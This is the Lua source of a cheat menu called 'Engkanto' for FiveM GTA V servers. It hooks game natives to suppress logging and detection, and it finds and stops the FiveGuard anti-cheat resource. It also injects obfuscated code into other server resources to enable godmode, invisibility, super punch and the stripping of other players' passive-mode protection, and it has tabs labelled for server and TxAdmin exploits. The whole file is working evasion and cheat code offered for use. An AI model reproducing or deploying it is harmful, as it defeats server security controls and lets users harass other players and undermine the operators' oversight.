print("Engkantotin kaya kita hahaha")

local EngkantoLOADINGSCREEN = {}
local IsVisible = false
local DUI = nil
local ActiveMenu = {}

MachoHookNative(0xA351ED5D, function(id) 
    if _G.AntiVisualLogging then return false end
    return true
end)

MachoHookNative(0x2491A936, function(t) 
    if _G.AntiVisualLogging then return false end
    return true
end)

MachoHookNative(0x91557C15, function() 
    if _G.AntiVisualLogging then return false end
    return true
end)


MachoHookNative(0xAF35D1D9315F7962, function(m, x, y, z, h, n, s)
    return true
end)

MachoHookNative(0x4805D2B1D8CF46DA, function(e)
    return false, vector3(0.0, 0.0, 0.0)
end)

MachoHookNative(0x1C99E0E7339E0503, function(e, x, y, z)
    return true
end)

MachoHookNative(0xC5F6878D58C49C1D, function(e, t, x, y, z, ox, oy, oz, bi, dr, iu, fr, p12, p13)
    return true
end)

MachoHookNative(0x9174F9F130021BA8, function(v)
    return true
end)

MachoHookNative(0x45F73647F97335D5, function(v, h)
    return false
end)

MachoHookNative(0x3FEFBC9C14943567, function(e)
    return true
end)

MachoHookNative(0xD49F9B0955C36735, function(t, m, x, y, z, h, n, s)
    return true, t, m, x, y, z, h, false, true 
end)

MachoHookNative(0xEF2906E7C1097510, function(p, h, n, s)
    return true
end)

MachoHookNative(0x509D5813D30E381A, function(m, x, y, z, n, s, d)
    return true
end)

MachoHookNative(0x6B9BBD38D379D59F, function(e1, e2, b, x, y, z, rx, ry, rz, p9, p10, p11, p12, p13, p14)
    return true
end)

MachoHookNative(0xD10F3ADC03BC946F, function(e, t, u)
    return true
end)

MachoHookNative(0xAD27EB244FC5943E, function(e, p1, p2)
    return true, e, true, true
end)

MachoHookNative(0x8630247A45BD6829, function(x1, y1, z1, x2, y2, z2, d, p7, w, o, n, p11, s)
    local shooter = (_G.freecamEnabled or _G.ChaosStealthActive) and 0 or o
    return true, x1, y1, z1, x2, y2, z2, d, p7, w, shooter, n, p11, s
end)

MachoHookNative(0x86745F91F1467571, function(x1, y1, z1, x2, y2, z2, d, p7, w, o, a, i, sp)
    local shooter = (_G.freecamEnabled or _G.ChaosStealthActive) and 0 or o
    return true, x1, y1, z1, x2, y2, z2, d, p7, w, shooter, a, i, sp
end)

MachoHookNative(0xF1D71308A7FC12BC, function(p, t, p2, p3)
    return true
end)

MachoHookNative(0x6B76DC1F3AE6E6A3, function()
    return true
end)

MachoHookNative(0x7FDD1128, function()
    return true
end)

MachoHookNative(0x91310870, function()
    return true
end)

MachoHookNative(0xE3AD2BDBA6269024, function(x, y, z, t, s, a, i, sh) 
    return true 
end)

MachoHookNative(0x44767B57FD359927, function()
    if _G.freecamEnabled then
        local p = GetEntityCoords(PlayerPedId())
        return false, p.x, p.y, p.z
    end
    return true
end)

MachoHookNative(0x3D690E7A4E1FD694, function(pi, c)
    if _G.freecamEnabled then return false, false end
    return true
end)

MachoHookNative(0x1CA59E306EC61077, function(ni, t)
    if _G.ChaosStealthActive then return false end
    return true
end)

MachoHookNative(0x310D69A, function(e, n) 
    return false, 0 
end)

MachoHookNative(0x06840DA4F95356E2, function(e, x, y, z, a, d, r, ca)
    return true 
end)

MachoHookNative(0x77296029819F05BC, function(v, id)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, -1 end
    return true 
end)

MachoHookNative(0xAD65EB21154E70A8, function(v, id)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, false end
    return true
end)

MachoHookNative(0x67EEDAF341A92728, function(v)
    local pV = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 and v == pV then return false, true end
    return true
end)

MachoHookNative(0x2E0E1B31, function(p)
    if p == PlayerPedId() then return false, 30 end 
    return true
end)

MachoHookNative(0x6B76DC38C32A6BF0, function(entity, health)
    if _G.MachoImmortalActive and entity == PlayerPedId() then
        return false, 200 
    end
    return true
end)

MachoHookNative(0x239A3351C72DA67F, function(player, toggle)
    if _G.MachoImmortalActive and player == PlayerId() then
        return false, true 
    end
    return true
end)

local MenuSize = vec2(1050, 500)
local MenuStartCoords = vec2(500, 500)

local TabsBarWidth = 150
local SectionsPadding = 10
local MachoPanelGap = 15

local SectionChildWidth = MenuSize.x - TabsBarWidth
local SectionChildHeight = MenuSize.y - (2 * SectionsPadding)

local ColumnWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
local HalfHeight = (SectionChildHeight - (SectionsPadding * 3)) / 2

    local MenuWindow = MachoMenuTabbedWindow("Engkanto", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
    MachoMenuSetKeybind(MenuWindow, 0x22)
    MachoMenuSetAccent(MenuWindow, 0, 255, 255)

local function CreateRainbowInterface()
    CreateThread(function()
        local offset = 0.0
        while true do
            offset = offset + 0.062
            local r = math.floor(127 + 127 * math.sin(offset))
            local g = math.floor(127 + 127 * math.sin(offset + 2))
            local b = math.floor(127 + 127 * math.sin(offset + 1))
            MachoMenuSetAccent(MenuWindow, r, g, b)
                Wait(22)
            end
        end)
    end
    
    local WelcomeDevTab          = MachoMenuSmallText(MenuWindow,"Enjoy!")

    local PlayerTab              = MachoMenuAddTab(MenuWindow, "Self Options")
    local TeleportTab            = MachoMenuAddTab(MenuWindow, "Teleport")
    local VehicleTab             = MachoMenuAddTab(MenuWindow, "Vehicle")
    local ServerTab              = MachoMenuAddTab(MenuWindow, "Trolls")
    local SettingsTab            = MachoMenuAddTab(MenuWindow, "Settings")
    local ToolsTab               = MachoMenuAddTab(MenuWindow,"Tools")
    local ServerReadyExploitsTab = MachoMenuSmallText(MenuWindow,"Server Ready Exploit")
    local ServerListTab          = MachoMenuAddTab(MenuWindow,"Server List")    
    local OtherExploitsTab          = MachoMenuAddTab(MenuWindow,"Other Exploits")
  
local function PlayerTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionOneStartX = TabsBarWidth + SectionsPadding
    local SectionOneEndX = SectionOneStartX + EachSectionWidth
    local SectionOne = MachoMenuGroup(tab, "Self Options", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

    local SectionTwoStartX = SectionOneEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "Other Options", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function TeleportTabContent(tab)
    -- Start Coordinates
    local startX = TabsBarWidth + SectionsPadding
    local startY = SectionsPadding + MachoPanelGap
    
    -- Full Dimensions
    local FullWidth = SectionChildWidth - (SectionsPadding * 2)
    local FullHeight = SectionChildHeight - SectionsPadding

    -- Single Group for everything
    local SectionOne = MachoMenuGroup(tab, "Teleport Options", startX, startY, startX + FullWidth, startY + FullHeight)

    return SectionOne
end

local function VehicleTabContent(tab)
    local leftX = TabsBarWidth + SectionsPadding
    local topY = SectionsPadding + MachoPanelGap
    local midY = topY + HalfHeight + SectionsPadding

    local SectionOne = MachoMenuGroup(tab, "Mods", leftX, topY, leftX + ColumnWidth, topY + HalfHeight)
    local SectionTwo = MachoMenuGroup(tab, "Plate & Spawning", leftX, midY, leftX + ColumnWidth, midY + HalfHeight)

    local rightX = leftX + ColumnWidth + SectionsPadding
    local SectionThree = MachoMenuGroup(tab, "Other", rightX, SectionsPadding + MachoPanelGap, rightX + ColumnWidth, SectionChildHeight)

    return SectionOne, SectionTwo, SectionThree
end

local function VehicleTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionOneStartX = TabsBarWidth + SectionsPadding
    local SectionOneEndX = SectionOneStartX + EachSectionWidth
    local SectionOne = MachoMenuGroup(tab, "Vehicle Mods", SectionOneStartX, SectionsPadding + MachoPanelGap, SectionOneEndX, SectionChildHeight)

    local SectionTwoStartX = SectionOneEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "My Vehicle", SectionTwoStartX, SectionsPadding + MachoPanelGap, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function ServerTabContent(tab)
    local EachSectionWidth = (SectionChildWidth - (SectionsPadding * 3)) / 2
    local SectionStartX = TabsBarWidth + SectionsPadding
    local SectionEndX = SectionStartX + EachSectionWidth
    local SectionY = SectionsPadding + MachoPanelGap

    -- Left section: Spawner
    local SectionOne = MachoMenuGroup(tab, "Safe Chaos", SectionStartX, SectionY, SectionEndX, SectionChildHeight)

    -- Right section: Other
    local SectionTwoStartX = SectionEndX + SectionsPadding
    local SectionTwoEndX = SectionTwoStartX + EachSectionWidth
    local SectionTwo = MachoMenuGroup(tab, "Trolls", SectionTwoStartX, SectionY, SectionTwoEndX, SectionChildHeight)

    return SectionOne, SectionTwo
end

local function SettingsTabContent(tab)
    -- Start Coordinates
    local startX = TabsBarWidth + SectionsPadding
    local startY = SectionsPadding + MachoPanelGap
    
    -- Full Dimensions
    local FullWidth = SectionChildWidth - (SectionsPadding * 2)
    local FullHeight = SectionChildHeight - SectionsPadding

    -- Single Group for everything
    local SectionOne = MachoMenuGroup(tab, "Settings Options", startX, startY, startX + FullWidth, startY + FullHeight)

    return SectionOne
end

local function ToolsTabContent(tab)
    -- Start Coordinates
    local startX = TabsBarWidth + SectionsPadding
    local startY = SectionsPadding + MachoPanelGap
    
    -- Full Dimensions
    local FullWidth = SectionChildWidth - (SectionsPadding * 2)
    local FullHeight = SectionChildHeight - SectionsPadding

    -- Single Group for everything
    local SectionOne = MachoMenuGroup(tab, "Tools Options", startX, startY, startX + FullWidth, startY + FullHeight)

    return SectionOne
end


local function ServerListTabContent(tab)
    -- Start Coordinates
    local startX = TabsBarWidth + SectionsPadding
    local startY = SectionsPadding + MachoPanelGap
    
    -- Full Dimensions
    local FullWidth = SectionChildWidth - (SectionsPadding * 2)
    local FullHeight = SectionChildHeight - SectionsPadding

    -- Single Group for everything
    local SectionOne = MachoMenuGroup(tab, "Esx Server Only", startX, startY, startX + FullWidth, startY + FullHeight)

    return SectionOne
end

local function OtherExploitsTabContent(tab)
    -- Start Coordinates
    local startX = TabsBarWidth + SectionsPadding
    local startY = SectionsPadding + MachoPanelGap
    
    -- Full Dimensions
    local FullWidth = SectionChildWidth - (SectionsPadding * 2)
    local FullHeight = SectionChildHeight - SectionsPadding

    -- Single Group for everything
    local SectionOne = MachoMenuGroup(tab, "TxAdmin Exploits", startX, startY, startX + FullWidth, startY + FullHeight)

    return SectionOne
end

-- Tab Sections
local PlayerTabSections = { PlayerTabContent(PlayerTab) }
local TeleportTabSections = { TeleportTabContent(TeleportTab) }
local VehicleTabSections = { VehicleTabContent(VehicleTab) }
local ServerTabSections = { ServerTabContent(ServerTab) }
local SettingsTabSections = { SettingsTabContent(SettingsTab) }
local ToolsTabSections = { ToolsTabContent(ToolsTab) }
local ServerListTabSections = { ServerListTabContent(ServerListTab) }
local OtherExploitsTabSections = { OtherExploitsTabContent(OtherExploitsTab) }


-- Functions
local function CheckResource(resource)
    return GetResourceState(resource) == "started"
end

local function LoadBypasses()
Wait(500)
 
    MachoMenuNotification("Engkanto", "Engkanto Loading Bypasses.")

    local function DetectFiveGuard()
        local function ResourceFileExists(resourceName, fileName)
            local file = LoadResourceFile(resourceName, fileName)
            return file ~= nil
        end

        local fiveGuardFile = "FiveGuard"
        local numResources = GetNumResources()

        for i = 0, numResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if ResourceFileExists(resourceName, fiveGuardFile) then
                return true, resourceName
            end
        end

        return false, nil
    end

    local found, resourceName = DetectFiveGuard()
    if found and resourceName then
        MachoResourceStop(resourceName)
    end

    Wait(400)

    MachoMenuNotification("Engkanto", "Welcome to Engkanto!")

       Wait(300)
    
   MachoMenuNotification("Engkanto", "YOU HAVE 9999 DAYS.")

   Wait(100)

    MachoMenuNotification("Engkanto", "PageDown > Default Menu key")
    
    MachoMenuNotification("Engkanto", "ENJOY!")

end


LoadBypasses()

    local function CheckResource(resource)
    return GetResourceState(resource) == "started"
end

local function GetInjectResource()
    return CheckResource("monitor") and "monitor"
        or CheckResource("FiveGuard") and "FiveGuard"
        or nil
end

-- Self
 MachoMenuCheckbox(PlayerTabSections[1], "Godmode", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if aXfPlMnQwErTyUi == nil then aXfPlMnQwErTyUi = false end
        aXfPlMnQwErTyUi = true

        local function OxWJ1rY9vB()
            local fLdRtYpLoWqEzXv = CreateThread
            fLdRtYpLoWqEzXv(function()
                while aXfPlMnQwErTyUi and not Unloaded do
                    local dOlNxGzPbTcQ = PlayerPedId()
                    local rKsEyHqBmUiW = PlayerId()

                    if GetResourceState("ReaperV1") == "started" then
                        local kcWsWhJpCwLI = SetPlayerInvincible
                        local ByTqMvSnAzXd = SetEntityInvincible
                        kcWsWhJpCwLI(rKsEyHqBmUiW, true)
                        ByTqMvSnAzXd(dOlNxGzPbTcQ, true)

                    elseif GetResourceState("WaveShield") == "started" then
                        local cvYkmZYIjvQQ = SetEntityCanBeDamaged
                        cvYkmZYIjvQQ(dOlNxGzPbTcQ, false)

                    else
                        local BiIqUJHexRrR = SetEntityCanBeDamaged
                        local UtgGRNyiPhOs = SetEntityProofs
                        local rVuKoDwLsXpC = SetEntityInvincible

                        BiIqUJHexRrR(dOlNxGzPbTcQ, false)
                        UtgGRNyiPhOs(dOlNxGzPbTcQ, true, true, true, false, true, false, false, false)
                        rVuKoDwLsXpC(dOlNxGzPbTcQ, true)
                    end

                    Wait(0)
                end
            end)
        end

        OxWJ1rY9vB()
    ]])
end, function()

    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        aXfPlMnQwErTyUi = false

        local dOlNxGzPbTcQ = PlayerPedId()
        local rKsEyHqBmUiW = PlayerId()

        if GetResourceState("ReaperV1") == "started" then
            local kcWsWhJpCwLI = SetPlayerInvincible
            local ByTqMvSnAzXd = SetEntityInvincible

            kcWsWhJpCwLI(rKsEyHqBmUiW, false)
            ByTqMvSnAzXd(dOlNxGzPbTcQ, false)

        elseif GetResourceState("WaveShield") == "started" then
            local AilJsyZTXnNc = SetEntityCanBeDamaged
            AilJsyZTXnNc(dOlNxGzPbTcQ, true)

        else
            local tBVAZMubUXmO = SetEntityCanBeDamaged
            local yuTiZtxOXVnE = SetEntityProofs
            local rVuKoDwLsXpC = SetEntityInvincible

            tBVAZMubUXmO(dOlNxGzPbTcQ, true)
            yuTiZtxOXVnE(dOlNxGzPbTcQ, false, false, false, false, false, false, false, false)
            rVuKoDwLsXpC(dOlNxGzPbTcQ, false)
        end
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Godmode II",
    function()
        MachoInjectResource('monitor', [[
            _G.MachoImmortalActive = true
            
            Citizen.CreateThread(function()
                while _G.MachoImmortalActive do
                    local ped = PlayerPedId()
                    local player = PlayerId()
                    
                    if DoesEntityExist(ped) then
                        -- 1. Hardcore God Mode (Natives)
                        SetEntityInvincible(ped, true)
                        SetPlayerInvincible(player, true)
                        SetEntityCanBeDamaged(ped, false)
                        SetPedCanRagdoll(ped, false)
                        
                        SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                        
                        local maxHealth = GetEntityMaxHealth(ped)
                        if GetEntityHealth(ped) < maxHealth then
                            SetEntityHealth(ped, maxHealth)
                        end
                        SetPedArmour(ped, 200)

                        ResetPlayerStamina(player)
                        SetPedMaxTimeInWater(ped, 999.0) -- Anti-Drown
                        
                        StopGameplayCamShaking(true)
                        SetPedMotionBlur(ped, false)
                        ClearPedBloodDamage(ped)
                        ResetPedVisibleDamage(ped)
                        ClearPedLastWeaponDamage(ped)
                    end
                    
                    Citizen.Wait(0) -- Frame-perfect loop
                end
            end)
        ]])
    end,
    function()
        MachoInjectResource('monitor', [[
            _G.MachoImmortalActive = false
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityInvincible(ped, false)
                SetPlayerInvincible(PlayerId(), false)
                SetEntityCanBeDamaged(ped, true)
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            end
        ]])
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Invisibility", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
        sRtYuIoPaSdFgHj = true

        local function d2NcWoyTfb()
            if sRtYuIoPaSdFgHj == nil then sRtYuIoPaSdFgHj = false end
            sRtYuIoPaSdFgHj = true

            local zXwCeVrBtNuMyLk = CreateThread
            zXwCeVrBtNuMyLk(function()
                while sRtYuIoPaSdFgHj and not Unloaded do
                    local uYiTpLaNmZxCwEq = SetEntityVisible
                    local hGfDrEsWxQaZcVb = PlayerPedId()
                    uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, false, false)
                    Wait(0)
                end

                local uYiTpLaNmZxCwEq = SetEntityVisible
                local hGfDrEsWxQaZcVb = PlayerPedId()
                uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
            end)
        end

        d2NcWoyTfb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        sRtYuIoPaSdFgHj = false

        local function tBKM1syGJL()
            local uYiTpLaNmZxCwEq = SetEntityVisible
            local hGfDrEsWxQaZcVb = PlayerPedId()
            uYiTpLaNmZxCwEq(hGfDrEsWxQaZcVb, true, false)
        end

        tBKM1syGJL()
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "No Ragdoll", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if mKjHgFdSaPlMnBv == nil then mKjHgFdSaPlMnBv = false end
        mKjHgFdSaPlMnBv = true

        local function jP7xUrK9Ao()
            local zVpLyNrTmQxWsEd = CreateThread
            zVpLyNrTmQxWsEd(function()
                while mKjHgFdSaPlMnBv and not Unloaded do
                    local oPaSdFgHiJkLzXc = SetPedCanRagdoll
                    oPaSdFgHiJkLzXc(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        jP7xUrK9Ao()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        mKjHgFdSaPlMnBv = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Infinite Stamina", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if uYtReWqAzXcVbNm == nil then uYtReWqAzXcVbNm = false end
        uYtReWqAzXcVbNm = true

        local function YLvd3pM0tB()
            local tJrGyHnMuQwSaZx = CreateThread
            tJrGyHnMuQwSaZx(function()
                while uYtReWqAzXcVbNm and not Unloaded do
                    local aSdFgHjKlQwErTy = RestorePlayerStamina
                    local rTyUiEaOpAsDfGhJk = PlayerId()
                    aSdFgHjKlQwErTy(rTyUiEaOpAsDfGhJk, 1.0)
                    Wait(0)
                end
            end)
        end

        YLvd3pM0tB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        uYtReWqAzXcVbNm = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Super Jump", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
        xCvBnMqWeRtYuIo = true

        local function JcWT2vYEq1()
            local yLkPwOiUtReAzXc = CreateThread
            yLkPwOiUtReAzXc(function()
                while xCvBnMqWeRtYuIo and not Unloaded do
                    local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                    local eRtYuIoPaSdFgHj = PlayerPedId()
                    local oPlMnBvCxZlKjHg = PlayerId()

                    hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                    Wait(0)
                end
            end)
        end

        JcWT2vYEq1()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        xCvBnMqWeRtYuIo = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Passive Mode", 
    function() 
        MachoHookNative(0x1913FE4CBF41C463,_isPassiveModeActive)
        _isPassiveModeActive = true
        local playerPed = PlayerPedId()
        SetPedConfigFlag(playerPed, 423, true)
        MachoMenuNotification("Engkanto", "Passive Mode Enabled")
    end,
    function() 
        _isPassiveModeActive = false
        local playerPed = PlayerPedId()
        SetPedConfigFlag(playerPed, 423, false)
        MachoMenuNotification("Engkanto", "Passive Mode Disabled!")
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Anti Passive Mode", 
    function() 
        MachoHookNative(0x1913FE4CBF41C463,_isAntiPassiveModeActive)
        _isAntiPassiveModeActive = true
            for _, pid in ipairs(GetActivePlayers() or {}) do
                if pid ~= PlayerId() then
                    local tped = GetPlayerPed(pid)
                    if DoesEntityExist(tped) then SetPedConfigFlag(tped,423,false)
                end
            end
        end
        MachoMenuNotification("Engkanto", "Anti Passive Mode Enabled")
    end,
    function() 
        _isAntiPassiveModeActive = false
            for _, pid in ipairs(GetActivePlayers() or {}) do
                if pid ~= PlayerId() then
                    local tped = GetPlayerPed(pid)
                    if DoesEntityExist(tped) then SetPedConfigFlag(tped,423,true)
                end
            end
        end
        MachoMenuNotification("Engkanto", "Anti Passive Mode Disabled!")
    end
)

MachoMenuCheckbox(PlayerTabSections[1], "Hulk Entity", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
        fgawjFmaDjdALaO = true

        local holdingEntity = false
        local holdingCarEntity = false
        local holdingPed = false
        local heldEntity = nil
        local entityType = nil
        local awfhjawrasfs = CreateThread

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                if holdingEntity and heldEntity then
                    local playerPed = PlayerPedId()
                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                    
                    if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                    elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                        RequestAnimDict('anim@heists@box_carry@')
                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                    end

                    if not IsEntityAttached(heldEntity) then
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                    end
                end
            end
        end)

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                local playerPed = PlayerPedId()
                local camPos = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                local direction = RotationToDirection(camRot)
                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                local validTarget = false

                if hit == 1 then
                    entityType = GetEntityType(entityHit)
                    if entityType == 3 or entityType == 2 or entityType == 1 then
                        validTarget = true
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                    end
                end

                if IsDisabledControlJustReleased(0, 38) then
                    if validTarget and not holdingEntity then
                        holdingEntity = true
                        heldEntity = entityHit

                        local wfuawruawts = AttachEntityToEntity

                        if entityType == 3 then
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        elseif entityType == 2 then
                            holdingCarEntity = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        elseif entityType == 1 then
                            holdingPed = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        end
                    end
                elseif IsDisabledControlJustReleased(0, 246) then
                    if holdingEntity then
                        local wgfawhtawrs = DetachEntity
                        local dfgjsdfuwer = ApplyForceToEntity
                        local sdgfhjwserw = ClearPedTasks

                        wgfawhtawrs(heldEntity, true, true)
                        dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                        sdgfhjwserw(PlayerPedId())
                    end
                end
            end
        end)

        function RotationToDirection(rotation)
            local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
            local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
            return direction
        end

        function DrawText3Ds(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
            local px, py, pz = table.unpack(GetGameplayCamCoords())
            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
            local fov = (1 / GetGameplayCamFov()) * 100
            scale = scale * fov

            if onScreen then
                SetTextScale(0.0 * scale, 0.35 * scale)
                SetTextFont(0)
                SetTextProportional(1)
                SetTextColour(255, 255, 255, 215)
                SetTextDropshadow(0, 0, 0, 0, 155)
                SetTextEdge(2, 0, 0, 0, 150)
                SetTextDropShadow()
                -- SetTextOutline()
                SetTextEntry("STRING")
                SetTextCentre(1)
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        fgawjFmaDjdALaO = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Super Punch", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
        qWeRtYuIoPlMnBv = true

        local function NdaFBuHkvo()
            local uTrEsAzXcVbNmQw = CreateThread
            uTrEsAzXcVbNmQw(function()
                while qWeRtYuIoPlMnBv and not Unloaded do
                    local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                    local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                    local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                    local sDfGhJkLqWeRtYu = PlayerId()
                    local DamageRateValue = 120.0
                    local WeaponNameForDamage = "WEAPON_UNARMED"


                    nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                    cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                    bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                    Wait(0)
                end
            end)
        end

        NdaFBuHkvo()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local qWeRtYuIoPlMnBv = false
        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
        local sDfGhJkLqWeRtYu = PlayerId()

        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
        bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Force Third Person", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
        kJfGhTrEeWqAsDz = true

        local function pqkTRWZ38y()
            local gKdNqLpYxMiV = CreateThread
            gKdNqLpYxMiV(function()
                while kJfGhTrEeWqAsDz and not Unloaded do
                    local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                    local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                    qWeRtYuIoPlMnBv(0)
                    aSdFgHjKlQwErTy(0)
                    Wait(0)
                end
            end)
        end

        pqkTRWZ38y()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        kJfGhTrEeWqAsDz = false
    ]])
end)

